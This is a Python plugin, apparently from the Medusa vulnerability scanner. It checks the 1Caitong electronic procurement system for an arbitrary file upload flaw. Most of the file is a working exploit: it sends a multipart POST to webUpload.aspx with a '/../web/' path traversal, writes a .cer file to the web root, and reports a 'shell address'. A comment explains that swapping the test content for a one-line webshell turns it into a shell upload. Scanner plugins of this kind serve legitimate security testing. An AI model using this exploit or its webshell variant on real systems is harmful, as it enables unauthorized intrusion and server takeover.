#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
注意！只能对oracle数据库起作用
'''
__author__ = 'Ascotbe'
__times__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2020-1-5"  # 插件编辑时间
        self.info['disclosure']='2015-11-12'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "OneCaitongElectronicProcurementSystemUploadsArbitraryFiles2"  # 插件名称
        self.info['name'] ='一采通电子采购系统任意文件上传' #漏洞名称
        self.info['affects'] = "1Caitong"  # 漏洞组件
        self.info['desc_content'] = "/Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/位置存在任意文件上传"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "暂无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=ClassCongregation.Proxies().result(proxies)

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = "/Comm/UploadFile/webUpload.aspx?AttId=9d37b73795649038.cer&FilePath=/../web/"
        payload_url = scheme + "://" + url +":"+ str(port)+ payload
        shell= scheme + "://" + url + ":" + str(port) + "9d37b73795649038.cer"
        data = '''
------WebKitFormBoundarySi7aFG5fhvI14Vbv
Content-Disposition: form-data; name="__VIEWSTATE"
/wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
------WebKitFormBoundarySi7aFG5fhvI14Vbv
Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
Content-Type: application/x-x509-ca-cert
testvul
------WebKitFormBoundarySi7aFG5fhvI14Vbv--
'''
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
        }

        resp = requests.post(payload_url,data=data,headers=headers, proxies=proxies,timeout=6, verify=False)
        con = resp.text
        code=resp.status_code
        #如果要上传shell直接把testvul这个值改为一句话就可以
        if code == 200 and con.lower().find("9d37b73795649038.cer") != -1:
            Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url,shell)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类